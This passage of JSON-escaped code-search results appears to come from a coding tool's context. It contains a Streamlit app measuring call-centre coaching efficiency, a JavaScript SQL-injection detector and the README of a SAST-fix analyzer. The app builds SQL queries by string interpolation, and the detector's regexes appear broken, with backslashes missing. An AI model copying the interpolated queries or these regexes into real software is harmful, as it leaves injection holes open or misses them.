coaching_sessions.coaching_plan_id\\",\\"lineNumber\\":85},{\\"text\\":\\"                JOIN app.users as cu ON coaching_sessions.creator_user_id = cu.user_id\\",\\"lineNumber\\":86},{\\"text\\":\\"                LEFT JOIN app.users as su ON coaching_sessions.manager_submitter_user_id = su.user_id\\",\\"lineNumber\\":87},{\\"text\\":\\"                JOIN app.users as au ON coaching_plans.agent_user_id = au.user_id\\",\\"lineNumber\\":88},{\\"text\\":\\"            WHERE coaching_sessions.manager_submitted_at > '{first_session_days.strftime(\\\\\\"%Y-%m-%d\\\\\\")}'\\",\\"lineNumber\\":89},{\\"text\\":\\"                AND coaching_sessions.session_at <= '{last_session_days.strftime(\\\\\\"%Y-%m-%d\\\\\\")}'\\",\\"lineNumber\\":90},{\\"text\\":\\"            \\\\\\"\\\\\\"\\\\\\")\\",\\"lineNumber\\":91},{\\"text\\":\\"        \\",\\"lineNumber\\":92},{\\"text\\":\\"        rows = cursor.fetchall()\\",\\"lineNumber\\":93},{\\"text\\":\\"        for session_note in rows:\\",\\"lineNumber\\":94},{\\"text\\":\\"            if session_note[6] is not None and len(session_note[6]) > 0:\\",\\"lineNumber\\":95},{\\"text\\":\\"                focus_criteria = session_note[6]\\",\\"lineNumber\\":96},{\\"text\\":\\"                for criteria in focus_criteria:\\",\\"lineNumber\\":97},{\\"text\\":\\"                    ids = criteria.split('/')\\",\\"lineNumber\\":98},{\\"text\\":\\"                    scorecard_template_id_name_map[ids[0]] = ''\\",\\"lineNumber\\":99},{\\"text\\":\\"                    coaching_sessions.append({\\",\\"lineNumber\\":100},{\\"text\\":\\"                        \\\\\\"session_id\\\\\\": session_note[9],\\",\\"lineNumber\\":101},{\\"text\\":\\"                        \\\\\\"usecase\\\\\\": session_note[10],\\",\\"lineNumber\\":102},{\\"text\\":\\"                        \\\\\\"coaching_plan_id\\\\\\": session_note[0],\\",\\"lineNumber\\":103},{\\"text\\":\\"                        \\\\\\"coaching_plan_url\\\\\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\",\\"lineNumber\\":104},{\\"text\\":\\"                        \\\\\\"creator_user_name\\\\\\": session_note[1],\\",\\"lineNumber\\":105},{\\"text\\":\\"                        \\\\\\"creator_user_id\\\\\\": session_note[2],\\",\\"lineNumber\\":106},{\\"text\\":\\"                        \\\\\\"submitter_user_name\\\\\\": session_note[3],\\",\\"lineNumber\\":107},{\\"text\\":\\"                        \\\\\\"submitter_user_id\\\\\\": session_note[4],\\",\\"lineNumber\\":108},{\\"text\\":\\"                        \\\\\\"session_time\\\\\\": session_note[5],\\",\\"lineNumber\\":109},{\\"text\\":\\"                        \\\\\\"focus_criteria_template_id\\\\\\": ids[0],\\",\\"lineNumber\\":110},{\\"text\\":\\"                        \\\\\\"focus_criteria_id\\\\\\": ids[1],\\",\\"lineNumber\\":111},{\\"text\\":\\"                        \\\\\\"agent_user_name\\\\\\": session_note[7],\\",\\"lineNumber\\":112},{\\"text\\":\\"                        \\\\\\"agent_user_id\\\\\\": session_note[8],\\",\\"lineNumber\\":113},{\\"text\\":\\"                        \\\\\\"before_score\\\\\\": -1,\\",\\"lineNumber\\":114},{\\"text\\":\\"                        \\\\\\"before_convo_count\\\\\\": 0,\\",\\"lineNumber\\":115},{\\"text\\":\\"                        \\\\\\"after_score\\\\\\": -1,\\",\\"lineNumber\\":116},{\\"text\\":\\"                        \\\\\\"after_convo_count\\\\\\": 0,\\",\\"lineNumber\\":117},{\\"text\\":\\"                    })\\",\\"lineNumber\\":118},{\\"text\\":\\"            else:\\",\\"lineNumber\\":119},{\\"text\\":\\"                coaching_sessions.append({\\",\\"lineNumber\\":120},{\\"text\\":\\"                    \\\\\\"session_id\\\\\\": session_note[9],\\",\\"lineNumber\\":121},{\\"text\\":\\"                    \\\\\\"coaching_plan_id\\\\\\": session_note[0],\\",\\"lineNumber\\":122},{\\"text\\":\\"                    \\\\\\"coaching_plan_url\\\\\\": build_coaching_plan_url(customer, session_note[8], session_note[0]),\\",\\"lineNumber\\":123},{\\"text\\":\\"                    \\\\\\"creator_user_name\\\\\\": session_note[1],\\",\\"lineNumber\\":124},{\\"text\\":\\"                    \\\\\\"creator_user_id\\\\\\": session_note[2],\\",\\"lineNumber\\":125},{\\"text\\":\\"                    \\\\\\"submitter_user_name\\\\\\": session_note[3],\\",\\"lineNumber\\":126},{\\"text\\":\\"                    \\\\\\"submitter_user_id\\\\\\": session_note[4],\\",\\"lineNumber\\":127},{\\"text\\":\\"                    \\\\\\"session_time\\\\\\": session_note[5],\\",\\"lineNumber\\":128},{\\"text\\":\\"                    \\\\\\"focus_criteria_template_id\\\\\\": '',\\",\\"lineNumber\\":129},{\\"text\\":\\"                    \\\\\\"focus_criteria_id\\\\\\": '',\\",\\"lineNumber\\":130},{\\"text\\":\\"                    \\\\\\"agent_user_name\\\\\\": session_note[7],\\",\\"lineNumber\\":131},{\\"text\\":\\"                    \\\\\\"agent_user_id\\\\\\": session_note[8],\\",\\"lineNumber\\":132},{\\"text\\":\\"                    \\\\\\"before_score\\\\\\": -1,\\",\\"lineNumber\\":133},{\\"text\\":\\"                    \\\\\\"before_convo_count\\\\\\": 0,\\",\\"lineNumber\\":134},{\\"text\\":\\"                    \\\\\\"after_score\\\\\\": -1,\\",\\"lineNumber\\":135},{\\"text\\":\\"                    \\\\\\"after_convo_count\\\\\\": 0,\\",\\"lineNumber\\":136},{\\"text\\":\\"                })\\",\\"lineNumber\\":137},{\\"text\\":\\"            user_id_name[session_note[2]] = session_note[1]\\",\\"lineNumber\\":138},{\\"text\\":\\"            user_id_name[session_note[4]] = session_note[3]\\",\\"lineNumber\\":139},{\\"text\\":\\"            user_id_name[session_note[8]] = session_note[7]\\",\\"lineNumber\\":140},{\\"lineNumber\\":141},{\\"text\\":\\"    if len(scorecard_template_id_name_map) == 0:\\",\\"lineNumber\\":142},{\\"text\\":\\"        return coaching_sessions\\",\\"lineNumber\\":143},{\\"lineNumber\\":144},{\\"text\\":\\"    with conn.cursor() as cursor:\\",\\"lineNumber\\":145},{\\"text\\":\\"        cursor.execute(f\\\\\\"\\\\\\"\\\\\\"\\",\\"lineNumber\\":146},{\\"text\\":\\"            SELECT\\",\\"lineNumber\\":147},{\\"text\\":\\"                resource_id as scorecard_template_id,\\",\\"lineNumber\\":148},{\\"text\\":\\"                title as title,\\",\\"lineNumber\\":149},{\\"text\\":\\"                template as template\\",\\"lineNumber\\":150},{\\"text\\":\\"            FROM director.scorecard_templates \\",\\"lineNumber\\":151},{\\"text\\":\\"            WHERE resource_id IN ('{\\\\\\"','\\\\\\".join(scorecard_template_id_name_map.keys())}')\\",\\"lineNumber\\":152},{\\"text\\":\\"            \\\\\\"\\\\\\"\\\\\\")\\",\\"lineNumber\\":153},{\\"text\\":\\"        \\",\\"lineNumber\\":154},{\\"text\\":\\"        rows = cursor.fetchall()\\",\\"lineNumber\\":155},{\\"text\\":\\"        for template in rows:\\",\\"lineNumber\\":156},{\\"text\\":\\"            scorecard_template_id_name_map[template[0]] = template[1]\\",\\"lineNumber\\":157},{\\"text\\":\\"            for items in template[2].get('items', []):\\",\\"lineNumber\\":158},{\\"text\\":\\"                if 'identifier' in items and 'displayName' in items:\\",\\"lineNumber\\":159},{\\"text\\":\\"                    template_criteria_id_name_map[items['identifier']] = items['displayName']\\",\\"lineNumber\\":160},{\\"text\\":\\"                if 'items' in items:\\",\\"lineNumber\\":161},{\\"text\\":\\"                    for criteria_items in items['items']:\\",\\"lineNumber\\":162},{\\"text\\":\\"                        if 'identifier' in criteria_items and 'displayName' in criteria_items:\\",\\"lineNumber\\":163},{\\"text\\":\\"                            template_criteria_id_name_map[criteria_items['identifier']] = criteria_items['displayName']\\",\\"lineNumber\\":164},{\\"lineNumber\\":165},{\\"text\\":\\"        for session in coaching_sessions:\\",\\"lineNumber\\":166},{\\"text\\":\\"            if session['focus_criteria_template_id'] != '':\\",\\"lineNumber\\":167},{\\"text\\":\\"                session['focus_criteria_template'] = scorecard_template_id_name_map[session['focus_criteria_template_id']]\\",\\"lineNumber\\":168},{\\"text\\":\\"            if session['focus_criteria_id'] != '' and session['focus_criteria_id'] in template_criteria_id_name_map:\\",\\"lineNumber\\":169},{\\"text\\":\\"                session['focus_criteria'] = template_criteria_id_name_map[session['focus_criteria_id']]\\",\\"lineNumber\\":170},{\\"text\\":\\"        \\",\\"lineNumber\\":171},{\\"text\\":\\"    return coaching_sessions\\",\\"lineNumber\\":172},{\\"lineNumber\\":173},{\\"lineNumber\\":174},{\\"text\\":\\"def load_scores_data(customer_display_name, coaching_sessions, num_days):\\",\\"lineNumber\\":175},{\\"text\\":\\"    if not coaching_sessions:\\",\\"lineNumber\\":176},{\\"text\\":\\"        return None\\",\\"lineNumber\\":177},{\\"lineNumber\\":178},{\\"text\\":\\"    customer = next(c for c in all_customers if c['display_name'] == customer_display_name)\\",\\"lineNumber\\":179},{\\"lineNumber\\":180},{\\"text\\":\\"    progress = st.progress(0, text=\\\\\\"Computing the coaching efficiency of the session notes...\\\\\\")\\",\\"lineNumber\\":181},{\\"lineNumber\\":182},{\\"text\\":\\"    port_number, port_forward_process = port_forward_ports_and_processes[customer['prod_env_name']]\\",\\"lineNumber\\":183},{\\"text\\":\\"    if port_forward_process is None or port_forward_process.poll() is not None:\\",\\"lineNumber\\":184},{\\"text\\":\\"        process = subprocess.Popen([\\",\\"lineNumber\\":185},{\\"text\\":\\"            'kubectl',\\",\\"lineNumber\\":186},{\\"text\\":\\"            f'--context={customer[\\\\\\"prod_env_name\\\\\\"]}',\\",\\"lineNumber\\":187},{\\"text\\":\\"            '--namespace=cresta-api',\\",\\"lineNumber\\":188},{\\"text\\":\\"            'port-forward',\\",\\"lineNumber\\":189},{\\"text\\":\\"            'services/insights-server',\\",\\"lineNumber\\":190},{\\"text\\":\\"            f'{port_number}:80',\\",\\"lineNumber\\":191},{\\"text\\":\\"        ])\\",\\"lineNumber\\":192},{\\"text\\":\\"        port_forward_ports_and_processes[customer['prod_env_name']] = (port_number, process)\\",\\"lineNumber\\":193},{\\"text\\":\\"        time.sleep(2)\\",\\"lineNumber\\":194},{\\"lineNumber\\":195},{\\"text\\":\\"    api_key = os.environ.get('INSIGHTS_SERVER_API_KEY')\\",\\"lineNumber\\":196},{\\"text\\":\\"    assert api_key, 'INSIGHTS_SERVER_API_KEY must be set'\\",\\"lineNumber\\":197},{\\"text\\":\\"    auth_metadata = [['authorization', f'ApiKey {api_key}']]\\",\\"lineNumber\\":198},{\\"lineNumber\\":199},{\\"text\\":\\"    with grpc.insecure_channel(\\",\\"lineNumber\\":200},{\\"text\\":\\"            f'localhost:{port_number}',\\",\\"lineNumber\\":201},{\\"text\\":\\"            options=[\\",\\"lineNumber\\":202},{\\"text\\":\\"                ('grpc.max_receive_message_length', 50000000),\\",\\"lineNumber\\":203},{\\"text\\":\\"            ],\\",\\"lineNumber\\":204},{\\"text\\":\\"    ) as channel:\\",\\"lineNumber\\":205},{\\"text\\":\\"        stub = analytics_service_pb2_grpc.AnalyticsServiceStub(channel)\\",\\"lineNumber\\":206},{\\"text\\":\\"        for coaching_session_idx in range(len(coaching_sessions)):\\",\\"lineNumber\\":207},{\\"text\\":\\"            progress.progress(coaching_session_idx / len(coaching_sessions), text=\\\\\\"Computing the coaching efficiency of the session notes...\\\\\\")\\",\\"lineNumber\\":208},{\\"text\\":\\"            coaching_session = coaching_sessions[coaching_session_idx]\\",\\"lineNumber\\":209},{\\"text\\":\\"            if coaching_session['focus_criteria_id'] != '':\\",\\"lineNumber\\":210},{\\"text\\":\\"                before_score, before_convo_count = query_agent_criteria_score(\\",\\"lineNumber\\":211},{\\"text\\":\\"                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'] - datetime.timedelta(days=num_days), coaching_session['session_time'])\\",\\"lineNumber\\":212},{\\"text\\":\\"                after_score, after_convo_count = query_agent_criteria_score(\\",\\"lineNumber\\":213},{\\"text\\":\\"                    stub, customer, auth_metadata, coaching_session['agent_user_id'], coaching_session['focus_criteria_id'], coaching_session['session_time'], coaching_session['session_time'] + datetime.timedelta(days=num_days))\\",\\"lineNumber\\":214},{\\"text\\":\\"                coaching_session['before_score'] = before_score\\",\\"lineNumber\\":215},{\\"text\\":\\"                coaching_session['before_convo_count'] = before_convo_count\\",\\"lineNumber\\":216},{\\"text\\":\\"                coaching_session['after_score'] = after_score\\",\\"lineNumber\\":217},{\\"text\\":\\"                coaching_session['after_convo_count'] = after_convo_count\\",\\"lineNumber\\":218},{\\"lineNumber\\":219},{\\"text\\":\\"    progress.empty()\\",\\"lineNumber\\":220},{\\"text\\":\\"    return coaching_sessions\\",\\"lineNumber\\":221},{\\"lineNumber\\":222},{\\"text\\":\\"@st.cache_data\\",\\"lineNumber\\":223},{\\"text\\":\\"def query_agent_criteria_score(_stub, customer, auth_metadata, agent_user_id, criteria_id, start_time, end_time):\\",\\"lineNumber\\":224},{\\"text\\":\\"    parent = f'customers/{customer[\\\\\\"customer_id\\\\\\"]}/profiles/{customer[\\\\\\"profile_id\\\\\\"]}'\\",\\"lineNumber\\":225},{\\"text\\":\\"    agent_user_name = f'customers/{customer[\\\\\\"customer_id\\\\\\"]}/users/{agent_user_id}'\\",\\"lineNumber\\":226},{\\"text\\":\\"    try:\\",\\"lineNumber\\":227},{\\"text\\":\\"        request = analytics_service_pb2.RetrieveQAScoreStatsRequest(\\",\\"lineNumber\\":228},{\\"text\\":\\"            parent=parent,\\",\\"lineNumber\\":229},{\\"text\\":\\"            read_from_clickhouse=True,\\",\\"lineNumber\\":230},{\\"text\\":\\"            filter_by_time_range=common_pb2.TimeRange(\\",\\"lineNumber\\":231},{\\"text\\":\\"                start_timestamp=timestamp_pb2.Timestamp(seconds=int(start_time.timestamp()), ),\\",\\"lineNumber\\":232},{\\"text\\":\\"                end_timestamp=timestamp_pb2.Timestamp(seconds=int(end_time.timestamp()), ),\\",\\"lineNumber\\":233},{\\"text\\":\\"            ),\\",\\"lineNumber\\":234},{\\"text\\":\\"            filter_by_attribute=qa_stats_pb2.QAAttribute(\\",\\"lineNumber\\":235},{\\"text\\":\\"                    users=[user_pb2.User(name=agent_user_name)],\\",\\"lineNumber\\":236},{\\"text\\":\\"                    criterion_identifiers=[criteria_id],\\",\\"lineNumber\\":237},{\\"text\\":\\"                ),\\",\\"lineNumber\\":238},{\\"text\\":\\"            group_by_attribute_types=[\\",\\"lineNumber\\":239},{\\"text\\":\\"                qa_stats_pb2.QAAttributeType.QA_ATTRIBUTE_TYPE_CRITERION,\\",\\"lineNumber\\":240},{\\"text\\":\\"            ],\\",\\"lineNumber\\":241},{\\"text\\":\\"        )\\",\\"lineNumber\\":242},{\\"text\\":\\"        response = _stub.RetrieveQAScoreStats(\\",\\"lineNumber\\":243},{\\"text\\":\\"            request,\\",\\"lineNumber\\":244},{\\"text\\":\\"            metadata=auth_metadata,\\",\\"lineNumber\\":245},{\\"text\\":\\"            timeout=600)\\",\\"lineNumber\\":246},{\\"text\\":\\"    except Exception as e:\\",\\"lineNumber\\":247},{\\"text\\":\\"        print(f'Error querying Insights Server: {e}')\\",\\"lineNumber\\":248},{\\"text\\":\\"        return None\\",\\"lineNumber\\":249},{\\"text\\":\\"    if response.qa_score_result.total_conversation_count == 0:\\",\\"lineNumber\\":250},{\\"text\\":\\"        return -1, 0\\",\\"lineNumber\\":251},{\\"text\\":\\"    return response.qa_score_result.average_qa_score, response.qa_score_result.total_conversation_count\\",\\"lineNumber\\":252},{\\"lineNumber\\":253},{\\"lineNumber\\":254},{\\"text\\":\\"##############################################################################################\\",\\"lineNumber\\":255},{\\"lineNumber\\":256},{\\"text\\":\\"customer_display_name = st.selectbox(\\",\\"lineNumber\\":257},{\\"text\\":\\"    'Select a customer:',\\",\\"lineNumber\\":258},{\\"text\\":\\"    [c['display_name'] for c in all_customers])\\",\\"lineNumber\\":259},{\\"lineNumber\\":260},{\\"text\\":\\"num_last_days = st.number_input(\\\\\\"How many days back to load the session notes?\\\\\\", min_value=7, max_value=180, value=30, step=1)\\",\\"lineNumber\\":261},{\\"lineNumber\\":262},{\\"text\\":\\"num_days = st.number_input(\\\\\\"How many days to measure the session efficiency?\\\\\\", min_value=1, max_value=30, value=7, step=1)\\",\\"lineNumber\\":263},{\\"lineNumber\\":264},{\\"text\\":\\"coaching_sessions = load_coaching_data(customer_display_name, num_last_days, num_days)\\",\\"lineNumber\\":265},{\\"lineNumber\\":266},{\\"text\\":\\"coaching_sessions = load_scores_data(customer_display_name, coaching_sessions, num_days)\\",\\"lineNumber\\":267},{\\"lineNumber\\":268},{\\"text\\":\\"with st.expander(\\\\\\"All loaded session notes\\\\\\", expanded=True):\\",\\"lineNumber\\":269},{\\"text\\":\\"    st.write(f\\\\\\"Loaded {len(coaching_sessions)} coaching sessions in total\\\\\\")\\",\\"lineNumber\\":270},{\\"text\\":\\"    session_df = pd.DataFrame(coaching_sessions)\\",\\"lineNumber\\":271},{\\"text\\":\\"    st.dataframe(session_df)\\",\\"lineNumber\\":272},{\\"text\\":\\"    st.write(f\\\\\\"Loaded {len(session_df['session_id'].unique())} coaching sessions in { len(session_df['coaching_plan_id'].unique()) } coaching plans.\\\\\\")\\",\\"lineNumber\\":273},{\\"text\\":\\"    # session_df.to_csv('coaching_sessions.csv', index=False)  # Set index=False to omit row numbers\\",\\"lineNumber\\":274},{\\"lineNumber\\":275},{\\"text\\":\\"with st.expander(\\\\\\"Session notes with valid scores\\\\\\", expanded=True):\\",\\"lineNumber\\":276},{\\"text\\":\\"    # Coach efficiency chart.\\",\\"lineNumber\\":277},{\\"text\\":\\"    valid_session_df = session_df[(session_df['before_score'] >= 0) & (session_df['after_score'] >= 0)].reset_index()\\",\\"lineNumber\\":278},{\\"text\\":\\"    st.dataframe(valid_session_df)\\",\\"lineNumber\\":279},{\\"text\\":\\" \\",\\"lineNumber\\":280},{\\"text\\":\\"    session_with_criteria_df = session_df[session_df['focus_criteria_id'] != '']\\",\\"lineNumber\\":281},{\\"text\\":\\"    st.write(f\\\\\\"Loaded {len(session_with_criteria_df['session_id'].unique())} coaching sessions with focus criteria in the coaching plan.\\\\\\")\\",\\"lineNumber\\":282},{\\"text\\":\\"    st.write(f\\\\\\"Loaded {len(valid_session_df['session_id'].unique())} coaching sessions with valid performance scores computed.\\\\\\")\\",\\"lineNumber\\":283},{\\"lineNumber\\":284},{\\"text\\":\\"def weighted_effiency(df):\\",\\"lineNumber\\":285},{\\"text\\":\\"    efficiency = ((df['after_score'] - df['before_score']) * df['after_convo_count']).sum() / df['after_convo_count'].sum()\\",\\"lineNumber\\":286},{\\"text\\":\\"    num_sessions =  len(df['session_id'].unique())\\",\\"lineNumber\\":287},{\\"text\\":\\"    return pd.Series({\\",\\"lineNumber\\":288},{\\"text\\":\\"        'efficiency': efficiency,\\",\\"lineNumber\\":289},{\\"text\\":\\"        'num_sessions': num_sessions\\",\\"lineNumber\\":290},{\\"text\\":\\"    })\\",\\"lineNumber\\":291},{\\"lineNumber\\":292},{\\"text\\":\\"with st.expander(\\\\\\"Session efficiency\\\\\\", expanded=True):\\",\\"lineNumber\\":293},{\\"text\\":\\"    session_efficiency_df = valid_session_df.groupby('session_id').apply(weighted_effiency).reset_index()\\",\\"lineNumber\\":294},{\\"text\\":\\"    session_efficiency_df.columns = ['Session id', 'Efficiency', 'Number of Sessions']\\",\\"lineNumber\\":295},{\\"text\\":\\"    st.dataframe(session_efficiency_df)\\",\\"lineNumber\\":296},{\\"text\\":\\"    fig = px.histogram(session_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\",\\"lineNumber\\":297},{\\"text\\":\\"    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\",\\"lineNumber\\":298},{\\"lineNumber\\":299},{\\"text\\":\\"with st.expander(\\\\\\"Coaching plan efficiency\\\\\\", expanded=True):\\",\\"lineNumber\\":300},{\\"text\\":\\"    plan_efficiency_df = valid_session_df.groupby('coaching_plan_id').apply(weighted_effiency).reset_index()\\",\\"lineNumber\\":301},{\\"text\\":\\"    plan_efficiency_df.columns = ['Coach Plan', 'Efficiency', 'Number of Sessions']\\",\\"lineNumber\\":302},{\\"text\\":\\"    st.dataframe(plan_efficiency_df)\\",\\"lineNumber\\":303},{\\"text\\":\\"    fig = px.histogram(plan_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\",\\"lineNumber\\":304},{\\"text\\":\\"    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\",\\"lineNumber\\":305},{\\"lineNumber\\":306},{\\"text\\":\\"with st.expander(\\\\\\"Focus criteria efficiency\\\\\\", expanded=True):\\",\\"lineNumber\\":307},{\\"text\\":\\"    criteria_efficiency_df = valid_session_df.groupby('focus_criteria').apply(weighted_effiency).reset_index()\\",\\"lineNumber\\":308},{\\"text\\":\\"    criteria_efficiency_df.columns = ['Focus Criteria', 'Efficiency', 'Number of Sessions']\\",\\"lineNumber\\":309},{\\"text\\":\\"    st.dataframe(criteria_efficiency_df)\\",\\"lineNumber\\":310},{\\"text\\":\\"    fig = px.histogram(criteria_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\",\\"lineNumber\\":311},{\\"text\\":\\"    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\",\\"lineNumber\\":312},{\\"lineNumber\\":313},{\\"text\\":\\"with st.expander(\\\\\\"Focus scorecard template efficiency\\\\\\", expanded=True):\\",\\"lineNumber\\":314},{\\"text\\":\\"    template_efficiency_df = valid_session_df.groupby('focus_criteria_template').apply(weighted_effiency).reset_index()\\",\\"lineNumber\\":315},{\\"text\\":\\"    template_efficiency_df.columns = ['Focus Scorecard Template', 'Efficiency', 'Number of Sessions']\\",\\"lineNumber\\":316},{\\"text\\":\\"    st.dataframe(template_efficiency_df)\\",\\"lineNumber\\":317},{\\"text\\":\\"    fig = px.histogram(template_efficiency_df, x=\\\\\\"Efficiency\\\\\\", nbins=100)\\",\\"lineNumber\\":318},{\\"text\\":\\"    st.plotly_chart(fig, theme=\\\\\\"streamlit\\\\\\")\\",\\"lineNumber\\":319},{\\"lineNumber\\":320},{\\"text\\":\\"with st.expander(\\\\\\"Coach efficiency\\\\\\", expanded=True):\\",\\"lineNumber\\":321},{\\"text\\":\\"    coach_efficiency_df = valid_session_df.groupby('creator_user_name').apply(weighted_effiency).reset_index()\\",\\"lineNumber\\":322},{\\"text\\":\\"    coach_efficiency_df.columns = ['Coach', 'Efficiency', 'Number of Sessions']\\",\\"lineNumber\\":323},{\\"text\\":\\"    st.dataframe(coach_efficiency_df)\\",\\"lineNumber\\":324},{\\"text\\":\\"    st.scatter_chart(data=coach_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\",\\"lineNumber\\":325},{\\"lineNumber\\":326},{\\"text\\":\\"with st.expander(\\\\\\"Agent efficiency\\\\\\", expanded=True):\\",\\"lineNumber\\":327},{\\"text\\":\\"    # Agent efficiency chart.\\",\\"lineNumber\\":328},{\\"text\\":\\"    agent_efficiency_df = valid_session_df.groupby('agent_user_name').apply(weighted_effiency).reset_index()\\",\\"lineNumber\\":329},{\\"text\\":\\"    agent_efficiency_df.columns = ['Agent', 'Efficiency', 'Number of Sessions']\\",\\"lineNumber\\":330},{\\"text\\":\\"    st.dataframe(agent_efficiency_df)\\",\\"lineNumber\\":331},{\\"text\\":\\"    st.scatter_chart(data=agent_efficiency_df, x='Number of Sessions', y='Efficiency', size='Number of Sessions')\\",\\"lineNumber\\":332},{\\"text\\":\\"\`\\",\\"lineNumber\\":333},{\\"lineNumber\\":334},{\\"lineNumber\\":335},{\\"text\\":\\"export const processingFunction = \`\\",\\"lineNumber\\":336},{\\"text\\":\\"function analyzeCodeForSQLInjection(code) {\\",\\"lineNumber\\":337},{\\"text\\":\\"  // Regular expressions to detect SQL Injection vulnerabilities\\",\\"lineNumber\\":338},{\\"text\\":\\"  const patterns = [\\",\\"lineNumber\\":339},{\\"text\\":\\"    /\\\\b(executeQuery|executeUpdate)s*(s*.*+.*)/i,\\",\\"lineNumber\\":340},{\\"text\\":\\"    /\\\\bStatements+.*=s+.*.createStatement()/i,\\",\\"lineNumber\\":341},{\\"text\\":\\"    /[\\\\\\"']s*+s*w+s*+s*[\\\\\\"']/i\\",\\"lineNumber\\":342},{\\"text\\":\\"  ];\\",\\"lineNumber\\":343},{\\"lineNumber\\":344},{\\"text\\":\\"  // Check if code matches any vulnerable patterns\\",\\"lineNumber\\":345},{\\"text\\":\\"  const vulnerabilities = patterns.reduce((issues, pattern) => {\\",\\"lineNumber\\":346},{\\"text\\":\\"    if (pattern.test(code)) {\\",\\"lineNumber\\":347},{\\"text\\":\\"      issues.push({\\",\\"lineNumber\\":348},{\\"text\\":\\"        type: \\\\\\"SQL Injection\\\\\\",\\",\\"lineNumber\\":349},{\\"text\\":\\"        severity: calculateSeverity(code),\\",\\"lineNumber\\":350},{\\"text\\":\\"        location: findVulnerableLocation(code, pattern)\\",\\"lineNumber\\":351},{\\"text\\":\\"      });\\",\\"lineNumber\\":352},{\\"text\\":\\"    }\\",\\"lineNumber\\":353},{\\"text\\":\\"    return issues;\\",\\"lineNumber\\":354},{\\"text\\":\\"  }, []);\\",\\"lineNumber\\":355},{\\"lineNumber\\":356},{\\"text\\":\\"  return {\\",\\"lineNumber\\":357},{\\"text\\":\\"    issues: vulnerabilities,\\",\\"lineNumber\\":358},{\\"text\\":\\"    summary: generateSummary(vulnerabilities),\\",\\"lineNumber\\":359},{\\"text\\":\\"    hasCritical: vulnerabilities.some(v => v.severity === \\\\\\"Critical\\\\\\")\\",\\"lineNumber\\":360},{\\"text\\":\\"  };\\",\\"lineNumber\\":361},{\\"text\\":\\"}\\",\\"lineNumber\\":362},{\\"text\\":\\"\`;\\",\\"lineNumber\\":363}]},\\"score\\":0.29074323177337646},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"consumers/analyzer/README.md\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":45}},\\"contents\\":\\"# Analyzer\\\\n\\\\nAnalyzer is the main Mobb component responsible for matching SAST vulnerabilities and customer source code and producing the fixes.\\\\n\\\\n## Useful commands\\\\n\\\\n- \`make test\` or \`make test-watch\` to run all test.\\\\n- \`make test-snapshot\` to update snapshots for all tests after code changes. Please review snapshots before committing changes.\\\\n- \`make codestyle\` to ensure code formatting. It is required before committing changes.\\\\n- \`poetry run python analyzer/start_analyzer.py\` to run the analyzer locally (outside of Docker environment). RabbitMQ required.\\\\n\\\\n## \`analyzer/fixes\` folder structure\\\\n\\\\nAll logic is stored in the nested folder structure: language (e.g., java/js/csharp) -> vulnerability type (e.g., pt/cmdi/xss).\\\\n\\\\nIn each folder, we have several files. They are loaded dynamically. Hence, names should be preserved.\\\\n\\\\n### \`types.py\`\\\\n\\\\nThis file contains dataclasses, which are used to communicate between \`analyzer.py\`, \`parser.py\`, and \`fixer.py\`.\\\\n\\\\nIt usually defines the child class of the \`FixInfo\` class, which is eventually stored as a Pickle file in S3 and used by \`interactive_fixer\` to produce a fix.\\\\n\\\\nThe \`FixInfo\` may optionally define \`get_questions\` function, which is responsible for the fix questions presented to the user.\\\\n\\\\n### \`parser.py\`\\\\n\\\\n\`parser.py\` is responsible for parsing customer source code and extracting information used later in \`analyzer.py\`.\\\\n\\\\nThis is the only place where AST manipulation is allowed. E.g., we can use \`execute_semgrep\` and \`execute_treesitter\` only in this file.\\\\n\\\\n### \`treesitter_rules\` folder\\\\n\\\\nThis folder contains \`lisp\` rule files. They are used by Tree-sitter to extract specific AST nodes.\\\\n\\\\nThe rule file name should be unique and in the shape of: \`meaning.language.lisp\` (for example, \`get_java_comments.java.lisp\`).\\\\n\\\\nUseful links:\\\\n\\\\n- Rules playground: https://tree-sitter.github.io/tree-sitter/playground\\\\n- Documentation: https://tree-sitter.github.io/tree-sitter/using-parsers#query-syntax\\\\n\\\\n### \`semgrep_rules\` folder\\\\n\\\\n\\",\\"originalContents\\":\\"# Analyzer\\\\n\\\\nAnalyzer is the main Mobb component responsible for matching SAST vulnerabilities and customer source code and producing the fixes.\\\\n\\\\n## Useful commands\\\\n\\\\n- \`make test\` or \`make test-watch\` to run all test.\\\\n- \`make test-snapshot\` to update snapshots for all tests after code changes. Please review snapshots before committing changes.\\\\n- \`make codestyle\` to ensure code formatting. It is required before committing changes.\\\\n- \`poetry run python analyzer/start_analyzer.py\` to run the analyzer locally (outside of Docker environment). RabbitMQ required.\\\\n\\\\n## \`analyzer/fixes\` folder structure\\\\n\\\\nAll logic is stored in the nested folder structure: language (e.g., java/js/csharp) -> vulnerability type (e.g., pt/cmdi/xss).\\\\n\\\\nIn each folder, we have several files. They are loaded dynamically. Hence, names should be preserved.\\\\n\\\\n### \`types.py\`\\\\n\\\\nThis file contains dataclasses, which are used to communicate between \`analyzer.py\`, \`parser.py\`, and \`fixer.py\`.\\\\n\\\\nIt usually defines the child class of the \`FixInfo\` class, which is eventually stored as a Pickle file in S3 and used by \`interactive_fixer\` to produce a fix.\\\\n\\\\nThe \`FixInfo\` may optionally define \`get_questions\` function, which is responsible for the fix questions presented to the user.\\\\n\\\\n### \`parser.py\`\\\\n\\\\n\`parser.py\` is responsible for parsing customer source code and extracting information used later in \`analyzer.py\`.\\\\n\\\\nThis is the only place where AST manipulation is allowed. E.g., we can use \`execute_semgrep\` and \`execute_treesitter\` only in this file.\\\\n\\\\n### \`treesitter_rules\` folder\\\\n\\\\nThis folder contains \`lisp\` rule files. They are used by Tree-sitter to extract specific AST nodes.\\\\n\\\\nThe rule file name should be unique and in the shape of: \`meaning.language.lisp\` (for example, \`get_java_comments.java.lisp\`).\\\\n\\\\nUseful 